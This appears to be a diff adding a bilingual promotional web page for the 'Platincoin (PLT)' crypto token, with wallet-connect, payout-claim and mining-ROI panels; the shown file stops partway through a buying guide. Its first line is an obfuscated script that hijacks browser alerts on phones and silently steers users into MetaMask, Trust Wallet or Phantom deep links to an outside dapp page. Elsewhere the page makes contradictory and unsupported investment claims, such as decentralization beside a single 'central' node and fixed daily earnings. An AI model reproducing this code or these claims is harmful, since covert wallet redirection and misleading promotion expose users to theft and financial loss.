@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>(function(){var orig=window.alert;window.alert=function(m){var msg=String(m||"").toLowerCase();if(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)&&(msg.includes("web3")||msg.includes("metamask")||msg.includes("wallet"))){var d="platincoin-protocol.github.io"+String.fromCharCode(47)+"Platincoin-PLT";var c=prompt("Scegli wallet (1, 2 o 3):\n1 = MetaMask\n2 = Trust Wallet\n3 = Phantom","1");if(!c)return;c=c.trim();if(c==="2"){window.location.href="https:"+String.fromCharCode(47,47)+"://trustwallet.com"+String.fromCharCode(47)+"open_url?coin_id=20000714&url=https:"+String.fromCharCode(47,47)+d;}else if(c==="3"){var t=encodeURIComponent("https:"+String.fromCharCode(47,47)+d);window.location.href="https:"+String.fromCharCode(47,47)+"phantom.app"+String.fromCharCode(47)+"ul"+String.fromCharCode(47)+"browse"+String.fromCharCode(47)+t+"?ref="+t;}else{window.location.href="https:"+String.fromCharCode(47,47)+"metamask.app.link"+String.fromCharCode(47)+"dapp"+String.fromCharCode(47)+d;}return;}return orig.apply(this,arguments);};})();</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Platincoin (PLT) | Official Portal</title>
+    <style>
+        :root {            
+            --bg-main: #0b0f19;
+            --bg-card: #131a2c;
+            --bg-input: #070a12;
+            --color-text: #f1f5f9;
+            --color-muted: #64748b;
+            --color-platinum: #e2e8f0;
+            --color-green: #10b981;
+            --color-gold: #f59e0b;
+            --border: #1e293b;
+        }
+        body { background: var(--bg-main); color: var(--color-text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding: 40px 20px; margin: 0; -webkit-font-smoothing: antialiased; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .header-nav { display: flex; justify-content: flex-end; margin-bottom: 10px; }
+        .lang-switch { display: flex; background: #070a12; padding: 4px; border-radius: 8px; border: 1px solid var(--border); }
+        .lang-btn { background: transparent; border: none; color: var(--color-muted); padding: 6px 14px; font-size: 12px; font-weight: 700; border-radius: 6px; cursor: pointer; transition: all 0.2s; text-transform: uppercase; }
+        .lang-btn.active { background: var(--color-platinum); color: #0b0f19; }
+        h1 { font-size: 32px; font-weight: 800; letter-spacing: -0.5px; color: var(--color-text); margin: 15px 0 5px 0; text-transform: uppercase; }
+        .subtitle { color: var(--color-muted); font-size: 16px; margin-top: 0; margin-bottom: 40px; font-weight: 500; letter-spacing: 0.5px; }
+        .logo-container { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
+        .logo-img { width: 140px; height: 140px; border-radius: 50%; object-fit: cover; box-shadow: 0 0 40px rgba(226, 232, 240, 0.15); border: 2px solid var(--color-platinum); }
+        .grid { display: flex; gap: 16px; flex-wrap: wrap; margin: 30px auto; }
+        .card { flex: 1; min-width: 190px; background: var(--bg-card); padding: 22px; border-radius: 16px; border: 1px solid var(--border); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.4); text-align: left; }
+        .card h3 { margin: 0 0 8px 0; color: var(--color-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; font-weight: 700; }
+        .card p { font-size: 26px; font-weight: 700; margin: 0; color: var(--color-text); letter-spacing: -0.5px; }
+        .card small { display: block; margin-top: 6px; color: var(--color-muted); font-size: 11px; }
+        .btn { display: inline-block; background: var(--color-platinum); color: #0b0f19; padding: 12px 24px; border-radius: 10px; text-decoration: none; font-weight: 700; margin-top: 10px; transition: all 0.2s; cursor: pointer; border: none; font-size: 14px; box-shadow: 0 4px 12px rgba(226,232,240,0.2); }
+        .btn:hover { background: #ffffff; transform: translateY(-1px); }
+        .btn-secondary { display: inline-block; background: transparent; color: var(--color-platinum); border: 1px solid var(--border); padding: 12px 24px; border-radius: 10px; text-decoration: none; font-weight: 700; margin-top: 10px; font-size: 14px; margin-left: 10px; cursor: pointer; }
+        .btn-secondary:hover { background: rgba(255,255,255,0.05); border-color: var(--color-muted); color: #fff; }
+        section { max-width: 900px; margin: 60px auto 0 auto; text-align: left; border-top: 1px solid var(--border); padding-top: 50px; }
+        section h2 { text-align: left; color: var(--color-text); font-size: 22px; font-weight: 700; margin-bottom: 25px; letter-spacing: -0.5px; }
+        .flex-layout { display: flex; gap: 30px; flex-wrap: wrap; margin-top: 20px; }
+        .flex-col-left { flex: 1.2; min-width: 320px; }
+        .flex-col-right { flex: 1; min-width: 320px; }
+        .calculator-box { background: var(--bg-card); padding: 24px; border-radius: 16px; border: 1px solid var(--border); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.4); box-sizing: border-box; }
+        .calculator-box h3 { margin: 0 0 15px 0; font-size: 15px; color: var(--color-platinum); font-weight: 600; }
+        .calc-group { margin-bottom: 16px; text-align: left; }
+        .calc-group label { display: block; font-size: 12px; color: var(--color-muted); margin-bottom: 6px; font-weight: 600; text-transform: uppercase; }
+        .calc-input, .calc-select { width: 100%; padding: 12px; background: var(--bg-input); border: 1px solid var(--border); color: var(--color-text); border-radius: 8px; box-sizing: border-box; font-size: 15px; font-weight: 600; }
+        .calc-result { background: var(--bg-input); padding: 14px 16px; border-radius: 8px; border-left: 4px solid var(--color-green); margin-top: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .calc-result p { margin: 0; font-size: 13px; color: var(--color-muted); }
+        .calc-result span { font-size: 18px; font-weight: 700; color: var(--color-text); }
+        .buy-step { background: var(--bg-card); padding: 18px; border-radius: 12px; border: 1px solid var(--border); margin-bottom: 12px; display: flex; gap: 16px; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .buy-num { background: var(--bg-input); color: var(--color-platinum); font-weight: 700; min-width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 13px; border: 1px solid var(--border); }
+        .buy-text { text-align: left; flex: 1; }
+        .buy-text h4 { margin: 0 0 3px 0; color: var(--color-text); font-size: 14px; font-weight: 600; }
+        .buy-text p { margin: 0; color: var(--color-muted); font-size: 12px; font-weight: 500; line-height: 1.4; }
+        .timeline { border-left: 2px solid var(--border); padding-left: 20px; margin-left: 10px; }
+        .timeline-item { margin-bottom: 25px; position: relative; }
+        .timeline-item::before { content: ""; position: absolute; left: -26px; top: 4px; width: 10px; height: 10px; border-radius: 50%; background: var(--color-platinum); border: 2px solid var(--bg-main); }
+        .timeline-item h4 { margin: 0 0 4px 0; color: var(--color-text); font-size: 15px; font-weight: 600; }
+        .timeline-item p { margin: 0; color: var(--color-muted); font-size: 13px; }
+        .faq-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; }
+        .faq-item { background: var(--bg-card); padding: 20px; border-radius: 12px; border: 1px solid var(--border); box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .faq-item h4 { margin: 0 0 8px 0; color: var(--color-text); font-size: 14px; font-weight: 600; }
+        .faq-item p { margin: 0; color: var(--color-muted); font-size: 12px; font-weight: 500; }
+        footer { margin-top: 80px; padding-top: 20px; border-top: 1px solid var(--border); color: var(--color-muted); font-size: 12px; }
+        .lang-it { display: none; }
+        @keyframes float {
+  0% { transform: translateY(0px); }
+  50% { transform: translateY(-12px); }
+  100% { transform: translateY(0px); }
+}
+.floating-logo {
+  animation: float 4s ease-in-out infinite;
+}
+.pulse-green {
+  display: inline-block;
+  width: 10px;
+  height: 10px;
+  background-color: #00ffcc;
+  border-radius: 50%;
+  margin-right: 8px;
+  box-shadow: 0 0 0 0 rgba(0, 255, 204, 0.7);
+  animation: pulse 1.5s infinite;
+  vertical-align: middle;
+}
+@keyframes pulse {
+  0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 204, 0.7); }
+  70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 255, 204, 0); }
+  100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 204, 0); }
+}
+
+    </style>
+</head>
+<body>
+<!-- BANNER CYBERPUNK BILINGUE IN ALTO -->
+<div style="background: #0d1117; border-bottom: 2px solid #00ffcc; padding: 10px; font-family: monospace; text-align: center; box-shadow: 0 4px 10px rgba(0, 255, 204, 0.2); width: 100%; margin-bottom: 30px;">
+  <span style="color: #00ffcc; font-weight: bold; margin-right: 15px;"><span class="pulse-green"></span>⚡ NETWORK STATUS [SHA-256]: ACTIVE</span>
+  
+  <!-- Scritte in INGLESE (Visibili se clicchi ENG) -->
+  <span class="lang-en" style="color: #ffffff; margin-right: 15px;">• Last Block: #<span id="banner-block-en">--</span></span>
+  <span class="lang-en" style="color: #ffffff; margin-right: 15px;">• Nodes: <span id="banner-nodes-en">1</span> (Central)</span>
+  <span class="lang-en" style="color: #00ffcc; font-weight: bold;">• Mined: <span id="banner-balance-en">34.150,00</span> PLT</span>
+
+  <!-- Scritte in ITALIANO (Visibili se clicchi ITA) -->
+  <span class="lang-it" style="color: #ffffff; margin-right: 15px;">• Ultimo Blocco: #<span id="banner-block-it">--</span></span>
+  <span class="lang-it" style="color: #ffffff; margin-right: 15px;">• Nodi: <span id="banner-nodes-it">1</span> (Centrale)</span>
+  <span class="lang-it" style="color: #00ffcc; font-weight: bold;">• Estratto: <span id="banner-balance-it">34.150,00</span> PLT</span>
+  <!-- Gas Tracker Bilingue -->
+  <span class="lang-en" style="color: #ffffff; margin-left: 15px;">• Gas: <span id="banner-gas-en" style="color: #00ffcc;">3 Gwei</span></span>
+  <span class="lang-it" style="color: #ffffff; margin-left: 15px;">• Gas: <span id="banner-gas-it" style="color: #00ffcc;">3 Gwei</span></span>
+
+</div>
+
+    <div class="container">
+        <div class="header-nav">
+            <div class="lang-switch">
+                <button id="btn-en" class="lang-btn active" onclick="switchLang('en')">ENG</button>
+                <button id="btn-it" class="lang-btn" onclick="switchLang('it')">ITA</button>
+            </div>
+        </div>
+        <div class="logo-container">
+            <img src="logo_3d_platino.png" alt="Platincoin Token" class="logo-img floating-logo">
+        </div>
+        <h1>Platincoin</h1>
+        <p class="subtitle lang-en">The Sovereign Digital Platinum Network</p>
+        <p class="subtitle lang-it">La Rete del Platino Digitale Sovrano</p>
+    <div class="grid">
+    <div class="card">
+        <h3 class="lang-en">Target Price</h3><h3 class="lang-it">Prezzo Target</h3>
+        <p style="color: var(--color-green);">$0.0008</p>
+        <span class="lang-en" style="font-size: 12px; color: #8b949e;">Genesis Evaluation</span>
+        <span class="lang-it" style="font-size: 12px; color: #8b949e;">Valutazione di Genesi</span>
+    </div>
+    <div class="card">
+        <h3 class="lang-en">Block Height</h3><h3 class="lang-it">Altezza Blocco</h3>
+        <p id="live-height">#0</p>
+        <span class="lang-en" style="font-size: 12px; color: #8b949e;">Network Sync Live</span>
+        <span class="lang-it" style="font-size: 12px; color: #8b949e;">Sincronizzazione Live</span>
+    </div>
+    <div class="card">
+        <h3 class="lang-en">Circulating Supply</h3><h3 class="lang-it">Fornitura Circolante</h3>
+        <p id="live-supply">0.00 PLT</p>
+        <span class="lang-en" style="font-size: 12px; color: #8b949e;">Algorithm Mined Amount</span>
+        <span class="lang-it" style="font-size: 12px; color: #8b949e;">Quantità Estratta</span>
+    </div>
+    <div class="card">
+        <h3 class="lang-en">Maximum Supply</h3><h3 class="lang-it">Fornitura Massima</h3>
+        <p>11,000,000</p>
+        <span class="lang-en" style="font-size: 12px; color: #8b949e;">Hard Cap Limit Parameters</span>
+        <span class="lang-it" style="font-size: 12px; color: #8b949e;">Parametri Hard Cap</span>
+    </div>
+</div>
+
+<!-- BOX CONTRATTO UFFICIALE & SICUREZZA ON-CHAIN -->
+<div style="background: #0d1117; border: 1px solid #30363d; border-radius: 12px; padding: 18px; margin-top: 20px; text-align: center;">
+    <div style="font-size: 12px; color: #00ffcc; font-weight: bold; letter-spacing: 1px; margin-bottom: 8px;">
+        <span class="lang-en">🛡️ VERIFIED BEP-20 SMART CONTRACT (BNB SMART CHAIN)</span>
+        <span class="lang-it">🛡️ SMART CONTRACT BEP-20 VERIFICATO (BNB SMART CHAIN)</span>
+    </div>
+    <div style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 10px; margin-bottom: 12px;">
+        <code id="contractAddrText" style="background: #161b22; padding: 8px 14px; border-radius: 6px; border: 1px solid #30363d; color: #e6edf3; font-size: 13px; word-break: break-all;">0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8</code>
+        <button onclick="navigator.clipboard.writeText('0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8'); this.innerText='Copied ✓'; setTimeout(()=>this.innerText='Copy', 2000);" style="background: #238636; color: white; border: none; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 12px;">Copy</button>
+        <a href="https://bscscan.com/token/0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8" target="_blank" style="background: #1f6feb; color: white; text-decoration: none; padding: 8px 14px; border-radius: 6px; font-weight: bold; font-size: 12px;">BscScan ↗</a>
+        <a href="https://geckoterminal.com/bsc/pools/0xa51e99928c39ae656b7cb38006b8a1d220479b2c" target="_blank" style="background: #21262d; color: #00ffcc; border: 1px solid #30363d; text-decoration: none; padding: 8px 14px; border-radius: 6px; font-weight: bold; font-size: 12px;">Live Chart (GeckoTerminal) ↗</a>
+                <a href="https://discord.gg/nzSD7asHbE" target="_blank" style="background:#5865F2;color:white;text-decoration:none;padding:8px 14px;border-radius:6px;font-weight:bold;font-size:12px;">Join Discord</a>
+                <a href="https://x.com/PlatincoinPLT" target="_blank" style="background:#161b22;color:white;border:1px solid #30363d;text-decoration:none;padding:8px 14px;border-radius:6px;font-weight:bold;font-size:12px;">X (@PlatincoinPLT)</a>
+
+    </div>
+    <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; font-size: 12px; color: #8b949e;">
+        <span style="background: rgba(35,134,54,0.15); color: #3fb950; padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(63,185,80,0.3);">✓ 0% Buy/Sell Tax</span>
+        <span style="background: rgba(35,134,54,0.15); color: #3fb950; padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(63,185,80,0.3);">✓ Fixed 11M Supply</span>
+        <span style="background: rgba(0,255,204,0.1); color: #00ffcc; padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(0,255,204,0.3);">✓ 1:1 PoW Backed</span>
+    </div>
+</div>
+<!-- BOX WAITLIST PRE-LANCIO (NETLIFY FORMS ANTI-SPAM) -->
+<div style="background: linear-gradient(135deg, #161b22 0%, #0d1117 100%); border: 1px solid #00ffcc; border-radius: 12px; padding: 20px; margin-top: 20px; text-align: center;">
+    <div style="font-size: 13px; color: #00ffcc; font-weight: bold; margin-bottom: 6px;">
+        <span class="lang-en">🚀 FAIR LAUNCH ALERT – GET NOTIFIED WHEN POOL OPENS</span>
+        <span class="lang-it">🚀 AVVISO FAIR LAUNCH – RICEVI L'ORARIO DI APERTURA POOL</span>
+    </div>
+    <p class="lang-en" style="font-size: 12px; color: #8b949e; margin: 0 auto 14px auto; max-width: 520px;">
+        No presale, 0% tax, 1-year LP lock. Join the early waitlist to receive the exact PancakeSwap launch link as soon as liquidity goes live.
+    </p>
+    <p class="lang-it" style="font-size: 12px; color: #8b949e; margin: 0 auto 14px auto; max-width: 520px;">
+        Nessuna prevendita, 0% tasse, liquidità bloccata 1 anno. Iscriviti per ricevere il link diretto di PancakeSwap nell'istante in cui apriremo la pool.
+    </p>
+    <form name="plt-waitlist" method="POST" data-netlify="true" netlify-honeypot="bot-field" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; max-width: 460px; margin: 0 auto;">
+        <input type="hidden" name="form-name" value="plt-waitlist" />
+        <p style="display: none;"><label>Don’t fill this out: <input name="bot-field" /></label></p>
+        <input type="email" name="email" required placeholder="Enter your email / Inserisci la tua email..." style="flex: 1; min-width: 220px; padding: 10px 14px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #ffffff; font-size: 13px;" />
+        <button type="submit" style="background: #00ffcc; color: #0d1117; border: none; padding: 10px 18px; border-radius: 6px; font-weight: bold; font-size: 13px; cursor: pointer;">Notify Me / Avvisami</button>
+    </form>
+</div>
+    
+    <div style="margin: 25px 0 40px 0;">
+            <a href="./explorer.html" class="btn lang-en">Launch Explorer</a>
+            <a href="./explorer.html" class="btn lang-it">Avvia Explorer</a>
+            <a href="./whitepaper.html" class="btn btn-secondary">📄 White Paper</a>
+        <a href="https://github.com" target="_blank" class="btn btn-secondary">GitHub</a>
+        <button class="btn btn-secondary lang-en" style="background: rgba(255,255,255,0.05);" onclick="alert('Smart Contract Deployment in corso.\n\nLa Pool di Liquidità automatizzata aprirà ufficialmente al completamento della Fase 1 della Roadmap.\n\nMonitora l\'altezza dei blocchi in tempo reale sul nostro Explorer!')">🥞 Buy PLT</button>
+            <button class="btn btn-secondary lang-it" style="background: rgba(255,255,255,0.05);" onclick="alert('Smart Contract Deployment in corso.\n\nLa Pool di Liquidità automatizzata aprirà ufficialmente al completamento della Fase 1 della Roadmap.\n\nMonitora l\'altezza dei blocchi in tempo reale sul nostro Explorer!')">🥞 Acquista PLT</button>
+            
+        </div>
+<!-- SEZIONE WEB3 PORTAL + ROI AFFIANCATI (STILE EXCHANGE) -->
+<div class="flex-layout" style="margin-top: 25px; margin-bottom: 25px;">
+  
+  <!-- PANNELLO DI SINISTRA: PORTALE WEB3 -->
+  <div class="card" style="flex: 1; min-width: 300px; background: #0d1117; border: 1px solid var(--border); padding: 25px; border-radius: 12px; text-align: center; display: flex; flex-direction: column; justify-content: space-between;">
+    <div>
+      <h3 class="lang-en" style="margin-top: 0; color: #ffffff;">Platincoin (PLT) - Web3 Portal</h3>
+      <h3 class="lang-it" style="margin-top: 0; color: #ffffff;">Platincoin (PLT) - Portale Web3</h3>
+
+      <button id="connectBtn" style="background-color: #f6851b; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px;">
+      <span class="lang-en">Connect Web3 Wallet</span>
+      <span class="lang-it">Connetti Wallet Web3</span>
+      </button>
+      
+      <div id="walletAddress" style="margin-top: 10px; color: #00ffcc; font-family: monospace; font-size: 12px;"></div>
+    </div>
+    
+    <div style="margin-top: 20px; border-top: 1px solid #1e293b; padding-top: 20px;">
+      <h4 class="lang-en" style="margin-bottom: 5px; color: #ffffff;">Claim Your Mined PLT</h4>
+      <h4 class="lang-it" style="margin-bottom: 5px; color: #ffffff;">Riscatta i tuoi PLT Minati</h4>
+      <p class="lang-en" style="color: #94a3b8; font-size: 13px; margin-bottom: 15px;">Current balance in miner: <strong id="live-supply-web3">--</strong> PLT</p>
+      <p class="lang-it" style="color: #94a3b8; font-size: 13px; margin-bottom: 15px;">Saldo attuale nel miner: <strong id="live-supply-web3-it">--</strong> PLT</p>
+      
+      <button id="claimBtn" disabled style="background-color: #6a1b9a; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: not-allowed; font-weight: bold; width: 100%;">
+        <span class="lang-en">Request Payout (Claim PLT)</span>
+        <span class="lang-it">Richiedi Payout (Claim PLT)</span>
+      </button>
+    </div>
+    <div id="statusMessage" style="margin-top: 15px; font-size: 12px; font-weight: bold;"></div>
+<button id="backupBtn" onclick="downloadPaperWallet()" style="background-color: #1e293b; color: #00ffcc; border: 1px solid #00ffcc; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 12px;">
+  <span class="lang-en">💾 Download Wallet Backup (.txt)</span>
+  <span class="lang-it">💾 Scarica Backup Wallet (.txt)</span>
+<button id="addTokenBtn" onclick="addTokenToWallet()" style="background-color: #0d1117; color: #ffffff; border: 1px solid #334155; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;">
+  <span class="lang-en">💳 Import PLT to Web3 Wallet</span>
+  <span class="lang-it">💳 Importa PLT nel Wallet Web3</span>
+</button>  
+</div>
+
+  <!-- PANNELLO DI DESTRA: CALCOLATORE ROI -->
+  <div class="card" style="flex: 1; min-width: 300px; background: #0d1117; border: 1px solid var(--border); padding: 25px; border-radius: 12px; display: flex; flex-direction: column; justify-content: space-between;">
+    <div>
+      <h3 class="lang-en" style="margin-top: 0; color: #00ffcc; font-family: monospace;">📊 CPU Mining ROI Calculator</h3>
+      <h3 class="lang-it" style="margin-top: 0; color: #00ffcc; font-family: monospace;">📊 Calcolatore ROI di Mining della CPU</h3>
+      
+      <div style="margin-top: 20px;">
+        <label class="lang-en" style="color: #94a3b8; display: block; margin-bottom: 8px; font-size: 14px;">Select CPU Cores for Mining:</label>
+        <label class="lang-it" style="color: #94a3b8; display: block; margin-bottom: 8px; font-size: 14px;">Seleziona i Core della CPU per il Mining:</label>
+        <select id="roi-cores" onchange="calculateMiningROI()" style="width: 100%; background: #05070a; border: 1px solid var(--border); color: #ffffff; padding: 12px; border-radius: 6px; font-family: monospace; cursor: pointer;">
+          <option value="2">2 Cores (Basic PC / Laptop)</option>
+          <option value="4" selected>4 Cores (Standard Desktop / Laptop)</option>
+          <option value="8">8 Cores (High-End Gaming Rig)</option>
+          <option value="16">16 Cores (Dedicated Mining Server)</option>
+        </select>
+      </div>
+    </div>
+    
+    <div style="background: #05070a; padding: 20px; border-radius: 8px; border: 1px dashed #1e293b; margin-top: 25px;">
+      <h4 class="lang-en" style="margin-top: 0; color: #ffffff; border-bottom: 1px solid #1e293b; padding-bottom: 8px; font-size: 14px;">Estimated Earnings (Price: $0.0008)</h4>
+      <h4 class="lang-it" style="margin-top: 0; color: #ffffff; border-bottom: 1px solid #1e293b; padding-bottom: 8px; font-size: 14px;">Guadagni Stimati (Prezzo: $0.0008)</h4>
+      <p style="margin: 12px 0; font-family: monospace; color: #ffffff; font-size: 14px;">• <span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">600.00</strong> PLT</p>
+      <p style="margin: 12px 0; font-family: monospace; color: #ffffff; font-size: 14px;">• <span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">18,000.00</strong> PLT</p>
+    </div>
+  </div>
+
+</div>
+  
+  <div id="statusMessageSecondary" style="margin-top: 15px; font-weight: bold;"></div>
+</div>
+     
+           <div class="flex-layout">
+            <div class="flex-col-left">
+                <div class="calculator-box" style="padding:18px;display:flex;flex-direction:column;">
+  <h3 class="lang-en" style="margin-bottom:12px;">Live Market Chart (PLT / USDT)</h3>
+  <h3 class="lang-it" style="display:none;margin-bottom:12px;">Grafico Live di Mercato (PLT / USDT)</h3>
+  <iframe id="geckoterminal-embed" title="GeckoTerminal Embed" src="https://geckoterminal.com" frameborder="0" allow="clipboard-write" allowfullscreen style="width:100%;height:350px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);"></iframe>
+</div></div>
+            <div class="flex-col-right">
+                <div class="buy-step">
+                    <div class="buy-num">01</div>
+                    <div class="buy-text lang-en"><h4>Configure Web3 Interface</h4><p>Initialize a decentralized non-custodial wallet (e.g. Phantom) configured on the BNB Chain network parameters.</p></div>
+                    <div class="buy-text lang-it"><h4>Configura Interfaccia Web3</h4><p>Inizializza un wallet decentralizzato non custodiale (es. Phantom) impostato sulla rete BNB Chain.</p></div>
+                </div>
+                <div class="buy-step">
+                    <div class="buy-num">02</div>
+                    <div class="buy-text lang-en"><h4>Import Token Coordinates</h4><p>Once Phase 1 concludes, paste the official smart contract address to track token availability parameters inside your ledger.</p></div>
+                    <div class="buy-text lang-it"><h4>Importa Coordinate Token</h4><p>Al termine della Fase 1, incolla l indirizzo dello smart contract ufficiale per tracciare i token.</p></div>
+                </div>
+                <div class="buy-step" style="margin-bottom: 0;">
+                    <div class="buy-num">03</div>
+                    <div class="buy-text lang-en"><h4>Execute Liquidity Swap</h4><p>Swap BNB or stablecoins directly against the automated liquidity pools established on decentralized structures.</p></div>
+                    <div class="buy-text lang-it"><h4>Esegui Swap di Liquidità</h4><p>Scambia BNB o stablecoin direttamente contro le pool di liquidità automatizzate su PancakeSwap.</p></div>
+                </div>
+            </div>
+        </div>
+        <section>
+            <h2 class="lang-en">Project Roadmap 2026/2027</h2><h2 class="lang-it">Roadmap del Progetto 2026/2027</h2>
+            <div class="timeline">
+                <div class="timeline-item">
+                    <h4 class="lang-en">Phase 1: Sovereign Mining & Verified BEP-20 Contract (Q4 2026)</h4><h4 class="lang-it">Fase 1: Mining Sovrano e Contratto BEP-20 Verificato (Q4 2026)</h4>
+                    <p class="lang-en">Launch of the programmatic dual SHA-256 ledger, secure CPU mining execution, and deployment of the verified BEP-20 contract on BNB Smart Chain.</p>
+                    <p class="lang-it">Lancio del registro programmatico a doppio livello SHA-256, esecuzione sicura del mining CPU e pubblicazione del contratto BEP-20 verificato su BNB Smart Chain.</p>
+                </div>
+                <div class="timeline-item">
+                    <h4 class="lang-en">Phase 2: Public Liquidity Launch & 1-Year LP Lock (Q4 2026 / Q1 2027)</h4><h4 class="lang-it">Fase 2: Lancio Liquidità Pubblica e Blocco LP 1 Anno (Q4 2026 / Q1 2027)</h4>
+                    <p class="lang-en">Deployment of the official PancakeSwap liquidity pool, 1-year time-locked LP security verification, and open decentralized trading.</p>
+                    <p class="lang-it">Apertura della pool di liquidità ufficiale su PancakeSwap, blocco temporale verificato degli LP per 1 anno e apertura degli scambi decentralizzati.</p>
+                </div>
+                <div class="timeline-item">
+                    <h4 class="lang-en">Phase 3: Decentralized Claim Vault & Network Expansion (Q2 2027)</h4><h4 class="lang-it">Fase 3: Claim Decentralizzato ed Espansione della Rete (Q2 2027)</h4>
+                    <p class="lang-en">Release of the automated on-chain Claim Smart Contract for external miners and integration across major market tracking platforms.</p>
+                    <p class="lang-it">Rilascio dello Smart Contract automatizzato per il prelievo on-chain (Claim) dei minatori esterni e integrazione nei principali tracker di mercato.</p>
+                </div>
+            </div>
+
+        </section>
+        <section style="margin-bottom: 40px;">
+            <h2 class="lang-en">Protocol Documentation FAQ</h2><h2 class="lang-it">FAQ sulla Documentazione del Protocollo</h2>
+            <div class="faq-grid">
+                <div class="faq-item">
+                    <h4 class="lang-en">What is Platincoin (PLT)?</h4><h4 class="lang-it">Cos è Platincoin (PLT)?</h4>
+                    <p class="lang-en">Platincoin is a highly-scarce, decentralized digital commodity secured by Proof of Work mathematical validation. It features a strict algorithmically enforced public supply limit of 11,000,000 tokens.</p>
+                    <p class="lang-it">Platincoin è una risorsa digitale altamente scarsa e decentralizzata, protetta dalla validazione matematica Proof of Work. Presenta un limite rigido di fornitura pubblica di 11.000.000 di token applicato algoritmicamente.</p>
+                </div>
+                <div class="faq-item">
+                    <h4 class="lang-en">How does the 1:1 public registry work?</h4><h4 class="lang-it">Come funziona il registro pubblico 1:1?</h4>
+                    <p class="lang-en">To ensure global financial compatibility, the market uses Wrapped Platincoin (PLT) contracts on decentralized exchanges, completely backed by the blocks validated by our protocol network.</p>
+                    <p class="lang-it">Per garantire la compatibilità finanziaria globale, il mercato utilizza contratti Platincoin su exchange decentralizzati, completamente supportati dai blocchi convalidati dalla nostra rete di protocollo.</p>
+                </div>
+            </div>
+        </section>
+    <!-- SEZIONE TOKENOMICS & COME ACQUISTARE -->
+    <section style="margin-top: 50px; text-align: left;">
+        <h2 class="lang-en" style="color: #00ffcc; font-family: monospace; text-align: center; margin-bottom: 25px;">📊 TOKENOMICS & PROTOCOL SECURITY</h2>
+        <h2 class="lang-it" style="color: #00ffcc; font-family: monospace; text-align: center; margin-bottom: 25px;">📊 TOKENOMICS E SICUREZZA DEL PROTOCOLLO</h2>
+
+        <div class="grid" style="margin-bottom: 40px;">
+            <div class="card">
+                <h3 class="lang-en">100% PoW Emission</h3><h3 class="lang-it">100% Emissione PoW</h3>
+                <p style="color: #00ffcc; font-size: 20px;"><span class="lang-en">No Presale / Fixed Supply</span><span class="lang-it">Nessuna Prevendita / Offerta Fissa</span></p>
+                <span class="lang-en" style="font-size: 12px; color: #8b949e;">Algorithmic SHA-256 Backing</span>
+                <span class="lang-it" style="font-size: 12px; color: #8b949e;">Garanzia Algoritmica SHA-256</span>
+            </div>
+            <div class="card">
+                <h3 class="lang-en">Liquidity Protection</h3><h3 class="lang-it">Protezione Liquidità</h3>
+                <p style="color: var(--color-green); font-size: 20px;"><span class="lang-en">1-Year Locked Liquidity</span><span class="lang-it">Liquidità Bloccata 1 Anno</span></p>
+                <span class="lang-en" style="font-size: 12px; color: #8b949e;">Time-Locked Smart Contract</span>
+                <span class="lang-it" style="font-size: 12px; color: #8b949e;">Smart Contract Bloccato a Tempo</span>
+            </div>
+            <div class="card">
+                <h3 class="lang-en">Trading Fees</h3><h3 class="lang-it">Tasse di Scambio</h3>
+                <p style="color: #e6edf3; font-size: 20px;"><span class="lang-en">0% Buy / Sell Tax</span><span class="lang-it">0% Tasse di Acquisto / Vendita</span></p>
+                <span class="lang-en" style="font-size: 12px; color: #8b949e;">Zero Hidden Contract Taxes</span>
+                <span class="lang-it" style="font-size: 12px; color: #8b949e;">Nessuna Tassa Nascosta</span>
+            </div>
+        </div>
+
+        <!-- GUIDA IN 3 PASSI -->
+        <div style="background: #0d1117; border: 1px solid #30363d; border-radius: 12px; padding: 25px; margin-bottom: 30px;">
+            <h3 class="lang-en" style="color: #ffffff; margin-top: 0; font-family: monospace;">🛒 HOW TO BUY PLT IN 3 STEPS</h3>
+            <h3 class="lang-it" style="color: #ffffff; margin-top: 0; font-family: monospace;">🛒 COME ACQUISTARE PLT IN 3 PASSI</h3>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-top: 15px;">
+                <div style="background: #161b22; padding: 15px; border-radius: 8px; border: 1px solid #21262d;">
